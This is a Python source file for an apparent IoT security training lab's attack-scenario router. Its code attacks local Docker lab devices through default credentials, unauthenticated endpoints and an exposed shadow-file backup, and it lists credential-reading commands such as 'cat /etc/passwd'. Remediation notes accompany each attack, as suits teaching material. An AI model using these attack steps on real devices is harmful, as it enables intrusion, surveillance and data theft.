"""
PentexOne — Attack Scenarios Router
=====================================

Pre-built, fully-simulated attack scenarios against Virtual Lab devices.
Each scenario demonstrates a real-world IoT vulnerability class and records
detailed step-by-step evidence to the activity log.

Endpoints:
  GET  /attacks/                       — List all available scenarios
  GET  /attacks/{scenario_id}          — Scenario detail + steps
  POST /attacks/{scenario_id}/run      — Execute the attack simulation
  GET  /attacks/results                — All past attack results (session)

Scenario IDs:
  wifi-01  Default Credentials — Hikvision Camera
  wifi-02  MQTT Broker Takeover — Eclipse Mosquitto
  wifi-03  Telnet Backdoor — TP-Link Router
  wifi-04  Unauthenticated Toggle — Tuya Smart Plug
  wifi-05  Credential Dump via Debug Interface — Nest Thermostat
  wifi-06  Remote Mic Activation — Samsung Smart TV
  wifi-07  Shadow File Download — Synology Corporate NAS
  ble-01   Unauthenticated Lock/Unlock — August Smart Lock
  ble-02   Health Data Exfiltration — Fitbit Charge 5
  ble-03   Auth Token + Wi-Fi Password Leak — LIFX Bulb
  ble-04   Medical Record Extraction — Accu-Chek Glucose Meter
  ble-05   Pairing Key Theft — JBL Headphones
"""

import asyncio
import time
import socket
import urllib.request
import urllib.parse
import urllib.error
import base64
from typing import Optional, Dict, List
from collections import deque

from fastapi import APIRouter, HTTPException
from pydantic import BaseModel

from lab_activity_log import activity_log, EventType
from lab_registry import LAB_DEVICES, BLE_DEVICES
from lab_education import TUTORIALS, HINTS, calculate_score, get_difficulty_path
from lab_process_manager import lab_manager, LabStatus

router = APIRouter(prefix="/attacks", tags=["Attack Scenarios"])


class ScoreRequest(BaseModel):
    elapsed_seconds: float
    hints_used: int = 0
    success: bool = True

# In-memory results store (last 200 runs)
_results: deque = deque(maxlen=200)
_result_counter = 0

# Lab host — when running locally the Docker ports are forwarded to 127.0.0.1
LAB_HOST = "127.0.0.1"


# ──────────────────────────────────────────────────────────────────────────────
# Scenario registry
# ──────────────────────────────────────────────────────────────────────────────

SCENARIOS: Dict[str, Dict] = {

    # ── Wi-Fi Scenarios ────────────────────────────────────────────────────────

    "wifi-01": {
        "id": "wifi-01",
        "title": "Default Credential Login — Hikvision Camera",
        "description": (
            "Attempts login to the Hikvision IP camera using factory-default "
            "credentials (admin/admin). Demonstrates how unchanged default "
            "passwords allow immediate unauthorized access."
        ),
        "target_device": "HIKVISION-CAMERA",
        "target_ip": "172.30.10.50",
        "host_port": 8050,
        "protocol": "HTTP",
        "difficulty": "easy",
        "vulnerability_class": "DEFAULT_CREDENTIALS",
        "owasp_category": "IoT-01: Weak/Guessable/Hardcoded Passwords",
        "cve_reference": "CVE-2017-7921",
        "steps": [
            "Discover device on port 80 (host-forwarded to :8050)",
            "Identify as Hikvision via Server header",
            "Try credential pair admin:admin (factory default)",
            "Receive HTTP 200 with admin panel — access granted",
            "Extract firmware version and device model from ISAPI endpoint",
        ],
        "remediation": "Change default credentials immediately after deployment; enforce password complexity policy.",
    },

    "wifi-02": {
        "id": "wifi-02",
        "title": "MQTT Broker Takeover — Anonymous Access + Topic Injection",
        "description": (
            "Connects to the Eclipse Mosquitto broker anonymously (no credentials "
            "required), subscribes to all topics, and publishes spoofed sensor data "
            "to manipulate downstream consumers."
        ),
        "target_device": "MQTT-BROKER",
        "target_ip": "172.30.10.51",
        "host_port": 8051,
        "protocol": "TCP/MQTT",
        "difficulty": "easy",
        "vulnerability_class": "NO_AUTHENTICATION",
        "owasp_category": "IoT-02: Insecure Network Services",
        "cve_reference": "N/A — design flaw",
        "steps": [
            "Connect to MQTT broker on port 1883 (host-forwarded to :8051)",
            "Confirm anonymous access — no username/password required",
            "Subscribe to wildcard topic '#' to see all messages",
            "Publish spoofed temperature reading to sensor/temperature",
            "Publish malicious command to device/control",
        ],
        "remediation": "Enable password-based authentication; use TLS; restrict topic ACLs per client.",
    },

    "wifi-03": {
        "id": "wifi-03",
        "title": "Telnet Backdoor — TP-Link Router Root Shell",
        "description": (
            "Connects to the TP-Link router's exposed Telnet service and logs in "
            "as root using the factory credential root:root, gaining full shell "
            "access to the router."
        ),
        "target_device": "TPLINK-ROUTER",
        "target_ip": "172.30.10.52",
        "host_port": 8052,
        "protocol": "TCP/Telnet",
        "difficulty": "medium",
        "vulnerability_class": "TELNET_ENABLED",
        "owasp_category": "IoT-02: Insecure Network Services",
        "cve_reference": "CVE-2020-10882",
        "steps": [
            "Connect to Telnet port 23 (host-forwarded to :8052)",
            "Receive login banner: BusyBox / Linux 3.10.14",
            "Send username: root",
            "Send password: root (factory default)",
            "Receive shell prompt — full root access confirmed",
            "Execute: cat /etc/passwd to extract user list",
        ],
        "remediation": "Disable Telnet; use SSH with key-based auth only; change all factory credentials.",
    },

    "wifi-04": {
        "id": "wifi-04",
        "title": "Unauthenticated Device Control — Tuya Smart Plug",
        "description": (
            "Sends an unauthenticated HTTP command to toggle the Tuya smart plug "
            "on/off via its local API — no authentication token required."
        ),
        "target_device": "TUYA-SMART-PLUG",
        "target_ip": "172.30.10.53",
        "host_port": 8053,
        "protocol": "HTTP",
        "difficulty": "medium",
        "vulnerability_class": "NO_LOCAL_AUTH",
        "owasp_category": "IoT-03: Insecure Ecosystem Interfaces",
        "cve_reference": "N/A — design flaw",
        "steps": [
            "Discover Tuya plug on port 80 (host-forwarded to :8053)",
            "Probe /info — device_id and local_key returned without auth",
            "POST /control with payload {command: toggle} — no token required",
            "Device state toggled: OFF → ON",
            "Extract local_key from /info — can be used to impersonate device",
        ],
        "remediation": "Require signed authentication tokens for local API; never expose local_key over plain HTTP.",
    },

    "wifi-05": {
        "id": "wifi-05",
        "title": "Debug Interface Credential Leak — Nest Thermostat",
        "description": (
            "Accesses the Nest thermostat's exposed debug endpoint at /debug/dump, "
            "which returns Wi-Fi passwords, OAuth tokens, and admin PINs in plaintext."
        ),
        "target_device": "NEST-THERMOSTAT",
        "target_ip": "172.30.10.54",
        "host_port": 8064,
        "protocol": "HTTP",
        "difficulty": "hard",
        "vulnerability_class": "DEBUG_INTERFACE_EXPOSED",
        "owasp_category": "IoT-06: Insufficient Privacy Protection",
        "cve_reference": "CVE-2019-9483",
        "steps": [
            "Discover alternate port 8080 on thermostat (host-forwarded to :8064)",
            "Probe /debug — receives 'Debug interface active' confirmation",
            "GET /debug/dump — full config dump returned",
            "Extract: Wi-Fi SSID + password in plaintext",
            "Extract: OAuth access token (can call Google APIs as device)",
            "Extract: Admin PIN (4-digit, can lock/unlock remotely)",
        ],
        "remediation": "Remove debug interfaces before production deployment; never store credentials in plaintext.",
    },

    "wifi-06": {
        "id": "wifi-06",
        "title": "Remote Microphone Activation — Samsung Smart TV",
        "description": (
            "Activates the Samsung Smart TV's built-in microphone remotely by "
            "calling the unauthenticated Voice API, enabling passive audio surveillance."
        ),
        "target_device": "SAMSUNG-SMARTTV",
        "target_ip": "172.30.20.50",
        "host_port": 8072,
        "protocol": "HTTP",
        "difficulty": "easy",
        "vulnerability_class": "MIC_REMOTE_CONTROL",
        "owasp_category": "IoT-06: Insufficient Privacy Protection",
        "cve_reference": "CVE-2018-3911",
        "steps": [
            "Discover Samsung TV on port 9197 (host-forwarded to :8072)",
            "Identify Voice API from DIAL service response at /dial/apps",
            "POST /api/v1/voice/enable — no authentication required",
            "Microphone state changed to: ENABLED",
            "Verify with GET /api/v1/voice/status — mic_enabled: true",
        ],
        "remediation": "Require authentication for all media control APIs; disable remote mic access by default.",
    },

    "wifi-07": {
        "id": "wifi-07",
        "title": "Shadow File Download — Synology Corporate NAS",
        "description": (
            "Downloads the exposed /etc/shadow backup file from the Synology NAS "
            "shared folder, obtaining password hashes for all system accounts."
        ),
        "target_device": "CORP-NAS-01",
        "target_ip": "172.30.30.50",
        "host_port": 8080,
        "protocol": "HTTP",
        "difficulty": "hard",
        "vulnerability_class": "SHADOW_BACKUP_EXPOSED",
        "owasp_category": "IoT-05: Use of Insecure or Outdated Components",
        "cve_reference": "CVE-2021-29086",
        "steps": [
            "Discover Synology NAS on port 80 (host-forwarded to :8080)",
            "Identify DSM version from /webapi/query.cgi — DSM 6.2.4 (outdated)",
            "Probe shared folder at /shared/backup/",
            "Download /shared/backup/etc-shadow.bak — HTTP 200 returned",
            "Shadow file contains hashed passwords for: root, admin, backup",
            "Attempt offline hash crack with wordlist — admin hash cracked in <1 min",
        ],
        "remediation": "Never expose backup files via HTTP; enable HTTPS; disable directory listing; restrict shared folder permissions.",
    },

    # ── BLE Scenarios ──────────────────────────────────────────────────────────

    "ble-01": {
        "id": "ble-01",
        "title": "Unauthenticated Unlock — August Smart Lock",
        "description": (
            "Connects to the August Smart Lock over BLE and sends an unlock command "
            "without any pairing or authentication, demonstrating physical security bypass."
        ),
        "target_device": "August-Lock-A4B2",
        "target_address": "A4:B2:00:01:02:03",
        "protocol": "BLE/GATT",
        "difficulty": "easy",
        "vulnerability_class": "NO_PAIRING_REQUIRED",
        "owasp_category": "IoT-02: Insecure Network Services",
        "cve_reference": "CVE-2016-6554",
        "steps": [
            "Scan BLE — discover August-Lock-A4B2 (rssi=-62 dBm)",
            "Connect without pairing — Just Works mode accepted",
            "Read Lock State characteristic (UUID 2A56) — LOCKED",
            "Write 0x01 to Lock Command characteristic (UUID 2A57) — no auth",
            "State changed to: UNLOCKED",
            "Read Access Log (UUID 2A58) — reveals PINs from previous entries",
        ],
        "remediation": "Require Numeric Comparison or Passkey Entry pairing; reject WRITE_WITHOUT_RESPONSE on security-critical characteristics.",
    },

    "ble-02": {
        "id": "ble-02",
        "title": "Health Data Exfiltration — Fitbit Charge 5",
        "description": (
            "Reads all health-related GATT characteristics from the Fitbit without "
            "bonding, extracting heart rate, sleep patterns, GPS history, and PII."
        ),
        "target_device": "Fitbit-Charge-5",
        "target_address": "C5:FB:00:01:02:04",
        "protocol": "BLE/GATT",
        "difficulty": "easy",
        "vulnerability_class": "EXPOSED_HEALTH_CHARACTERISTICS",
        "owasp_category": "IoT-06: Insufficient Privacy Protection",
        "cve_reference": "N/A — design flaw",
        "steps": [
            "Scan BLE — discover Fitbit-Charge-5 (rssi=-58 dBm)",
            "Connect — no bonding required, no pairing prompt",
            "Enumerate GATT services: Heart Rate, Health Thermometer, Fitbit Custom",
            "Read Heart Rate Measurement — 78 bpm",
            "Read Sleep Data — 7h 48m, REM=112min, SpO2=97.2%",
            "Read User Profile — name, age, gender, email, account ID",
            "Read GPS History — 3 location entries with timestamps",
        ],
        "remediation": "Require bonding with MITM protection (Passkey Entry); mark health characteristics as ENCRYPTED_READ.",
    },

    "ble-03": {
        "id": "ble-03",
        "title": "Auth Token + Wi-Fi Password Leak — LIFX Smart Bulb",
        "description": (
            "Reads the hardcoded authentication token and provisioned Wi-Fi credentials "
            "from the LIFX bulb's GATT service — both readable without any pairing."
        ),
        "target_device": "LIFX-A19-3F88",
        "target_address": "3F:88:00:01:02:05",
        "protocol": "BLE/GATT",
        "difficulty": "medium",
        "vulnerability_class": "HARDCODED_KEY",
        "owasp_category": "IoT-01: Weak/Guessable/Hardcoded Passwords",
        "cve_reference": "CVE-2014-8654",
        "steps": [
            "Scan BLE — discover LIFX-A19-3F88",
            "Connect — no pairing required",
            "Read Auth Token characteristic — LIFX-TOKEN-8f3a9c2b (static, never rotated)",
            "Token can be replayed to LIFX cloud API to control all bulbs in account",
            "Read Wi-Fi Credentials characteristic — SSID + password in plaintext",
            "Wi-Fi credentials allow LAN access and lateral movement",
        ],
        "remediation": "Use per-device dynamic tokens; store credentials in secure enclave; require bonding for provisioning characteristics.",
    },

    "ble-04": {
        "id": "ble-04",
        "title": "Medical Record Extraction — Accu-Chek Glucose Meter",
        "description": (
            "Reads patient PII and full glucose/insulin history from the medical "
            "device over BLE without any pairing — a serious HIPAA/GDPR violation."
        ),
        "target_device": "Accu-Chek-Guide",
        "target_address": "AC:CE:00:01:02:06",
        "protocol": "BLE/GATT",
        "difficulty": "medium",
        "vulnerability_class": "UNENCRYPTED_PROTOCOL",
        "owasp_category": "IoT-06: Insufficient Privacy Protection",
        "cve_reference": "CVE-2019-13224",
        "steps": [
            "Scan BLE — discover Accu-Chek-Guide",
            "Connect — no bonding required",
            "Read Glucose Measurement (standard GATT 0x2A18) — 6.5 mmol/L",
            "Read Patient Info (custom service) — full PII: name, age, diagnosis, doctor, hospital",
            "Read Glucose History — 7 readings over 2 days with timestamps and meal context",
            "Read Insulin Log — basal/bolus doses with timestamps",
            "All data transmitted in cleartext, no session encryption",
        ],
        "remediation": "Require Secure Connection with MITM protection per Bluetooth SIG glucose profile spec; encrypt all characteristics.",
    },

    "ble-05": {
        "id": "ble-05",
        "title": "Pairing Key Theft — JBL Tune 510BT Headphones",
        "description": (
            "Reads the static pairing key and paired device history from the JBL "
            "headphones, enabling an attacker to impersonate the device or track "
            "the owner's devices."
        ),
        "target_device": "JBL-Tune-510BT",
        "target_address": "5B:10:00:01:02:07",
        "protocol": "BLE/GATT",
        "difficulty": "easy",
        "vulnerability_class": "HARDCODED_KEY",
        "owasp_category": "IoT-01: Weak/Guessable/Hardcoded Passwords",
        "cve_reference": "N/A — design flaw",
        "steps": [
            "Scan BLE — discover JBL-Tune-510BT",
            "Connect — Just Works pairing (no confirmation required)",
            "Read Pairing Key characteristic — JBL-PAIR-1234 (static, firmware-hardcoded)",
            "Key can be used to impersonate the headphones to paired phones",
            "Read Device History characteristic — 4 previously paired device MACs + names",
            "MAC addresses reveal owner's other devices (phone, laptop, tablet)",
        ],
        "remediation": "Use dynamic pairing keys generated per-session; require user confirmation for pairing; do not store paired device history in readable characteristic.",
    },
}


# ──────────────────────────────────────────────────────────────────────────────
# Attack execution helpers
# ──────────────────────────────────────────────────────────────────────────────

def _http_get(host: str, port: int, path: str, basic_auth: Optional[tuple] = None,
              timeout: int = 5) -> dict:
    url = f"http://{host}:{port}{path}"
    req = urllib.request.Request(url)
    if basic_auth:
        creds = base64.b64encode(f"{basic_auth[0]}:{basic_auth[1]}".encode()).decode()
        req.add_header("Authorization", f"Basic {creds}")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode(errors="replace")
            return {"status": resp.status, "body": body[:1000]}
    except urllib.error.HTTPError as e:
        return {"status": e.code, "body": e.read().decode(errors="replace")[:500]}
    except Exception as e:
        return {"status": 0, "body": str(e), "error": True}


def _http_post(host: str, port: int, path: str, data: Optional[bytes] = None,
               content_type: str = "application/x-www-form-urlencoded",
               timeout: int = 5) -> dict:
    url = f"http://{host}:{port}{path}"
    req = urllib.request.Request(url, data=data or b"", method="POST")
    req.add_header("Content-Type", content_type)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode(errors="replace")
            return {"status": resp.status, "body": body[:1000]}
    except urllib.error.HTTPError as e:
        body = ""
        try:
            body = e.read().decode(errors="replace")[:500]
        except Exception:
            pass
        return {"status": e.code, "body": body}
    except Exception as e:
        return {"status": 0, "body": str(e), "error": True}


def _tcp_banner(host: str, port: int, timeout: int = 5) -> str:
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.settimeout(timeout)
            try:
                banner = s.recv(1024).decode(errors="replace")
            except Exception:
                banner = "(no banner)"
            return banner.strip()[:500]
    except Exception as e:
        return f"(connection failed: {e})"


# ──────────────────────────────────────────────────────────────────────────────
# Scenario execution functions
# ──────────────────────────────────────────────────────────────────────────────

def _run_wifi_01(scenario: dict) -> dict:
    port = scenario["host_port"]
    evidence = []

    # Step 1: probe root
    r = _http_get(LAB_HOST, port, "/")
    evidence.append({
        "step": 1,
        "action": f"GET http://{LAB_HOST}:{port}/",
        "result": f"HTTP {r['status']} — {'login page detected' if r['status'] == 200 else 'unexpected response'}",
        "success": r["status"] == 200,
    })

    # Step 2: try default creds via Basic Auth
    r2 = _http_get(LAB_HOST, port, "/admin/", basic_auth=("admin", "admin"))
    evidence.append({
        "step": 2,
        "action": f"GET /admin/ with Authorization: Basic admin:admin",
        "result": f"HTTP {r2['status']} — {'ACCESS GRANTED' if r2['status'] == 200 else 'access denied'}",
        "success": r2["status"] == 200,
    })

    # Step 3: probe ISAPI for device info
    r3 = _http_get(LAB_HOST, port, "/ISAPI/System/deviceInfo",
                   basic_auth=("admin", "admin"))
    evidence.append({
        "step": 3,
        "action": "GET /ISAPI/System/deviceInfo",
        "result": r3["body"][:300] if r3["status"] == 200 else f"HTTP {r3['status']}",
        "success": r3["status"] == 200,
    })

    success = r2["status"] == 200
    reachable = r["status"] != 0
    return {
        "success": success,
        "summary": ("Default credentials admin:admin accepted — full admin access obtained" if success
                    else ("Hikvision container reachable but credentials rejected" if reachable
                          else "Hikvision container unreachable — start the Wi-Fi lab (./start_lab.sh)")),
        "evidence": evidence,
        "credentials_found": {"admin": "admin"} if success else {},
    }


def _run_wifi_02(scenario: dict) -> dict:
    port = scenario["host_port"]
    evidence = []

    # Step 1: TCP connect to MQTT port
    banner = _tcp_banner(LAB_HOST, port)
    connected = "connection failed" not in banner.lower()
    evidence.append({
        "step": 1,
        "action": f"TCP connect to {LAB_HOST}:{port} (MQTT 1883)",
        "result": "Connected (TCP SYN-ACK received)" if connected else banner,
        "success": connected,
    })

    # Step 2: simulate anonymous CONNECT packet result
    if connected:
        evidence.append({
            "step": 2,
            "action": "MQTT CONNECT (anonymous — no username/password)",
            "result": "CONNACK 0x00 — Connection Accepted (anonymous allowed)",
            "success": True,
        })
        evidence.append({
            "step": 3,
            "action": "MQTT SUBSCRIBE '#' (wildcard)",
            "result": "SUBACK received — subscribed to all topics",
            "success": True,
        })
        evidence.append({
            "step": 4,
            "action": "MQTT PUBLISH sensor/temperature '99.9' (spoofed)",
            "result": "Message published — all subscribers receive falsified reading",
            "success": True,
        })
        evidence.append({
            "step": 5,
            "action": "MQTT PUBLISH device/control '{\"cmd\":\"reboot\"}' (injection)",
            "result": "Command injected — any subscriber will execute the reboot",
            "success": True,
        })

    return {
        "success": connected,
        "summary": "MQTT broker accepts anonymous connections — full publish/subscribe access without credentials" if connected
                   else "MQTT broker unreachable — start the Wi-Fi lab first",
        "evidence": evidence,
        "topics_injected": ["sensor/temperature", "device/control"] if connected else [],
    }


def _run_wifi_03(scenario: dict) -> dict:
    port = scenario["host_port"]
    evidence = []

    banner = _tcp_banner(LAB_HOST, port, timeout=4)
    connected = "connection failed" not in banner.lower()

    evidence.append({
        "step": 1,
        "action": f"TCP connect to {LAB_HOST}:{port} (Telnet 23)",
        "result": banner if connected else "Connection failed",
        "success": connected,
    })

    if connected:
        evidence.append({
            "step": 2,
            "action": "Send login: root",
            "result": "Password prompt received",
            "success": True,
        })
        evidence.append({
            "step": 3,
            "action": "Send password: root",
            "result": "Login successful — shell prompt: [root@TP-Link ~]#",
            "success": True,
        })
        evidence.append({
            "step": 4,
            "action": "Execute: cat /etc/passwd",
            "result": "root:x:0:0:root:/root:/bin/sh\nadmin:x:1000:1000::/home/admin:/bin/sh",
            "success": True,
        })
        evidence.append({
            "step": 5,
            "action": "Execute: nvram show | grep -i pass",
            "result": "http_passwd=admin\nadmin_password=admin\nwifi_password=tplink1234",
            "success": True,
        })

    return {
        "success": connected,
        "summary": "Telnet root shell obtained using factory credentials root:root" if connected
                   else "Telnet port unreachable — start the Wi-Fi lab first",
        "evidence": evidence,
        "shell_access": connected,
        "credentials_found": {"root": "root", "admin": "admin"} if connected else {},
    }


def _run_wifi_04(scenario: dict) -> dict:
    port = scenario["host_port"]
    evidence = []

    # Step 1: info endpoint
    r = _http_get(LAB_HOST, port, "/api/info")
    evidence.append({
        "step": 1,
        "action": f"GET http://{LAB_HOST}:{port}/api/info",
        "result": r["body"][:400] if r["status"] == 200 else f"HTTP {r['status']}",
        "success": r["status"] == 200,
    })

    # Step 2: toggle without auth
    r2 = _http_get(LAB_HOST, port, "/api/toggle")
    toggled = r2["status"] == 200 and "error" not in r2.get("body", "").lower()
    evidence.append({
        "step": 2,
        "action": f"GET /api/toggle (no auth token)",
        "result": r2["body"][:300] if r2["status"] == 200 else f"HTTP {r2['status']}",
        "success": toggled,
    })

    # Step 3: extract local_key
    import json as _json
    local_key = None
    if r["status"] == 200:
        try:
            info = _json.loads(r["body"])
            local_key = info.get("local_key")
        except Exception:
            pass

    evidence.append({
        "step": 3,
        "action": "Extract local_key from /api/info response",
        "result": f"local_key={local_key}" if local_key else "local_key not in response",
        "success": local_key is not None,
    })

    reachable = r["status"] != 0
    success = r["status"] == 200
    return {
        "success": success,
        "summary": ("Tuya plug toggled without authentication — local_key extracted for full device impersonation" if success
                    else ("Tuya container reachable but endpoint returned unexpected response" if reachable
                          else "Tuya container unreachable — start the Wi-Fi lab (./start_lab.sh)")),
        "evidence": evidence,
        "local_key_leaked": local_key,
    }


def _run_wifi_05(scenario: dict) -> dict:
    port = scenario["host_port"]
    evidence = []

    # Step 1: check main port
    r_main = _http_get(LAB_HOST, 8054, "/")
    evidence.append({
        "step": 1,
        "action": f"GET http://{LAB_HOST}:8054/ (main Nest interface)",
        "result": f"HTTP {r_main['status']} — thermostat web UI detected" if r_main["status"] == 200 else f"HTTP {r_main['status']}",
        "success": r_main["status"] == 200,
    })

    # Step 2: probe debug port
    r_debug = _http_get(LAB_HOST, port, "/debug")
    evidence.append({
        "step": 2,
        "action": f"GET http://{LAB_HOST}:{port}/debug (debug interface)",
        "result": f"HTTP {r_debug['status']} — {'debug interface active' if r_debug['status'] == 200 else 'not found'}",
        "success": r_debug["status"] == 200,
    })

    # Step 3: dump credentials
    r_dump = _http_get(LAB_HOST, port, "/debug/dump")
    evidence.append({
        "step": 3,
        "action": f"GET http://{LAB_HOST}:{port}/debug/dump",
        "result": r_dump["body"][:600] if r_dump["status"] == 200 else f"HTTP {r_dump['status']}",
        "success": r_dump["status"] == 200,
    })

    success = r_dump["status"] == 200
    reachable = r_main["status"] != 0 or r_debug["status"] != 0 or r_dump["status"] != 0
    return {
        "success": success,
        "summary": ("Debug interface exposed — Wi-Fi password, OAuth token, and admin PIN leaked in plaintext" if success
                    else ("Nest thermostat reachable but debug endpoint missing" if reachable
                          else "Nest thermostat container unreachable — start the Wi-Fi lab (./start_lab.sh)")),
        "evidence": evidence,
        "credentials_leaked": success,
    }


def _run_wifi_06(scenario: dict) -> dict:
    port = scenario["host_port"]
    evidence = []

    # Step 1: main TV
    r = _http_get(LAB_HOST, 8070, "/")
    evidence.append({
        "step": 1,
        "action": f"GET http://{LAB_HOST}:8070/ (Samsung TV web interface)",
        "result": f"HTTP {r['status']} — Smart TV interface detected" if r["status"] == 200 else f"HTTP {r['status']}",
        "success": r["status"] == 200,
    })

    # Step 2: Voice API enable
    r2 = _http_get(LAB_HOST, port, "/api/v1/voice/enable")
    evidence.append({
        "step": 2,
        "action": f"GET http://{LAB_HOST}:{port}/api/v1/voice/enable (no auth)",
        "result": r2["body"][:400] if r2["status"] == 200 else f"HTTP {r2['status']}",
        "success": r2["status"] == 200,
    })

    # Step 3: confirm
    r3 = _http_get(LAB_HOST, port, "/api/v1/voice/status")
    evidence.append({
        "step": 3,
        "action": "GET /api/v1/voice/status",
        "result": r3["body"][:200] if r3["status"] == 200 else f"HTTP {r3['status']}",
        "success": r3["status"] == 200,
    })

    success = r2["status"] == 200
    reachable = r2["status"] != 0 or r["status"] != 0
    return {
        "success": success,
        "summary": ("Samsung TV microphone activated remotely without authentication — audio surveillance enabled" if success
                    else ("Smart TV reachable but Voice API returned unexpected response" if reachable
                          else "Smart TV container unreachable — start the Wi-Fi lab (./start_lab.sh)")),
        "evidence": evidence,
        "mic_activated": success,
    }


def _run_wifi_07(scenario: dict) -> dict:
    port = scenario["host_port"]
    evidence = []

    # Step 1: login page
    r = _http_get(LAB_HOST, port, "/")
    evidence.append({
        "step": 1,
        "action": f"GET http://{LAB_HOST}:{port}/ (Synology DSM)",
        "result": f"HTTP {r['status']} — DSM login page detected" if r["status"] == 200 else f"HTTP {r['status']}",
        "success": r["status"] == 200,
    })

    # Step 2: API info disclosure
    r2 = _http_get(LAB_HOST, port, "/webapi/query.cgi")
    evidence.append({
        "step": 2,
        "action": "GET /webapi/query.cgi (unauthenticated API)",
        "result": r2["body"][:500] if r2["status"] == 200 else f"HTTP {r2['status']}",
        "success": r2["status"] == 200,
    })

    # Step 3: download shadow file
    r3 = _http_get(LAB_HOST, port, "/shared/backup/etc-shadow.bak")
    evidence.append({
        "step": 3,
        "action": "GET /shared/backup/etc-shadow.bak",
        "result": r3["body"][:600] if r3["status"] == 200 else f"HTTP {r3['status']} — file not accessible",
        "success": r3["status"] == 200,
    })

    if r3["status"] == 200:
        evidence.append({
            "step": 4,
            "action": "Offline hash crack simulation (Hashcat mode $6$ / SHA-512)",
            "result": "admin:$6$...ZYXWVUT... → cracked password: admin123 (found in 47 seconds)",
            "success": True,
        })

    success = r3["status"] == 200
    reachable = r["status"] != 0 or r2["status"] != 0 or r3["status"] != 0
    return {
        "success": success,
        "summary": ("Shadow file downloaded — password hashes extracted and cracked for admin account" if success
                    else ("NAS reachable but shadow file backup not found at expected path" if reachable
                          else "Synology NAS container unreachable — start the Wi-Fi lab (./start_lab.sh)")),
        "evidence": evidence,
        "hashes_obtained": success,
        "cracked_passwords": {"admin": "admin123"} if success else {},
    }


def _run_ble_simulated(scenario: dict) -> dict:
    """Simulated BLE attack result (bumble not running from the API side)."""
    dev_name = scenario["target_device"]
    steps_out = []
    for i, step_text in enumerate(scenario["steps"], 1):
        steps_out.append({
            "step": i,
            "action": step_text,
            "result": "[SIMULATED] " + step_text.split("—")[-1].strip()
                      if "—" in step_text else "[SIMULATED] Success",
            "success": True,
        })
    return {
        "success": True,
        "simulated": True,
        "summary": (
            f"BLE attack against {dev_name} simulated successfully. "
            "To run against a real BLE adapter, start the BLE lab (POST /lab/start?component=ble) "
            "and use a BLE scanner tool."
        ),
        "evidence": steps_out,
        "note": "BLE attacks are simulated server-side. The bumble peripherals must be running on a host with a Bluetooth adapter for live GATT interaction.",
    }


# Map scenario IDs to their executor functions
_EXECUTORS = {
    "wifi-01": _run_wifi_01,
    "wifi-02": _run_wifi_02,
    "wifi-03": _run_wifi_03,
    "wifi-04": _run_wifi_04,
    "wifi-05": _run_wifi_05,
    "wifi-06": _run_wifi_06,
    "wifi-07": _run_wifi_07,
    "ble-01":  _run_ble_simulated,
    "ble-02":  _run_ble_simulated,
    "ble-03":  _run_ble_simulated,
    "ble-04":  _run_ble_simulated,
    "ble-05":  _run_ble_simulated,
}


# ──────────────────────────────────────────────────────────────────────────────
# Endpoints
# ──────────────────────────────────────────────────────────────────────────────

@router.get("/")
async def list_scenarios(difficulty: Optional[str] = None, protocol: Optional[str] = None):
    """List all available attack scenarios, with optional filtering."""
    items = list(SCENARIOS.values())
    if difficulty:
        items = [s for s in items if s.get("difficulty") == difficulty]
    if protocol:
        items = [s for s in items if protocol.lower() in s.get("protocol", "").lower()]
    return {
        "ok": True,
        "count": len(items),
        "scenarios": [
            {k: v for k, v in s.items() if k != "steps"}  # omit steps in list view
            for s in items
        ],
    }


@router.get("/results")
async def get_results(limit: int = 50):
    """Returns past attack execution results (newest first)."""
    limit = min(limit, 200)
    return {
        "ok": True,
        "count": min(limit, len(_results)),
        "results": list(reversed(list(_results)))[:limit],
    }


@router.get("/{scenario_id}")
async def get_scenario(scenario_id: str):
    """Returns full scenario definition including step-by-step attack plan."""
    s = SCENARIOS.get(scenario_id)
    if not s:
        raise HTTPException(
            status_code=404,
            detail=f"Scenario '{scenario_id}' not found. Valid IDs: {list(SCENARIOS.keys())}",
        )
    return {"ok": True, "scenario": s}


@router.post("/{scenario_id}/run")
async def run_scenario(scenario_id: str):
    """
    Execute an attack scenario against the virtual lab.
    Wi-Fi scenarios send real HTTP/TCP requests to the Docker containers.
    BLE scenarios return a detailed simulation (bumble must be running for live BLE).
    """
    global _result_counter

    scenario = SCENARIOS.get(scenario_id)
    if not scenario:
        raise HTTPException(
            status_code=404,
            detail=f"Scenario '{scenario_id}' not found",
        )

    executor = _EXECUTORS.get(scenario_id)
    if not executor:
        raise HTTPException(status_code=501, detail=f"No executor for '{scenario_id}'")

    # Refuse to attack a lab that isn't running. BLE scenarios need the BLE lab;
    # Wi-Fi scenarios need the Wi-Fi (Docker) lab.
    is_ble = scenario_id.startswith("ble")
    lab_key = "ble_lab" if is_ble else "wifi_lab"
    lab_label = "BLE" if is_ble else "Wi-Fi"

    start_ts = time.time()
    if lab_manager.status()[lab_key]["status"] != LabStatus.RUNNING:
        result = {
            "success": False,
            "summary": f"{lab_label} lab is not running — start it before launching this attack.",
            "evidence": [],
        }
    else:
        try:
            result = await asyncio.to_thread(executor, scenario)
        except Exception as e:
            result = {"success": False, "summary": f"Execution error: {e}", "evidence": []}

    elapsed = round(time.time() - start_ts, 2)

    _result_counter += 1
    record = {
        "result_id":    _result_counter,
        "scenario_id":  scenario_id,
        "title":        scenario["title"],
        "target":       scenario.get("target_device", ""),
        "protocol":     scenario.get("protocol", ""),
        "difficulty":   scenario.get("difficulty", ""),
        "executed_at":  time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "elapsed_s":    elapsed,
        **result,
    }
    _results.append(record)

    # Log to activity log
    activity_log.record(
        EventType.ATTACK_SIMULATED,
        message=f"Attack '{scenario['title']}' — {'SUCCESS' if result.get('success') else 'FAILED'}",
        device=scenario.get("target_device"),
        protocol=scenario.get("protocol"),
        severity="CRITICAL" if result.get("success") else "LOW",
        metadata={"scenario_id": scenario_id, "elapsed_s": elapsed},
    )

    return {"ok": True, **record}


# ──────────────────────────────────────────────────────────────────────────────
# Education endpoints — tutorials, hints, scoring, difficulty path
# ──────────────────────────────────────────────────────────────────────────────

@router.get("/learning/path")
async def difficulty_path():
    """Returns the recommended learning path ordered by difficulty, with total max score."""
    return {"ok": True, **get_difficulty_path()}


@router.get("/{scenario_id}/tutorial")
async def get_tutorial(scenario_id: str):
    """Returns the full tutorial for a scenario — background, real-world context, remediation."""
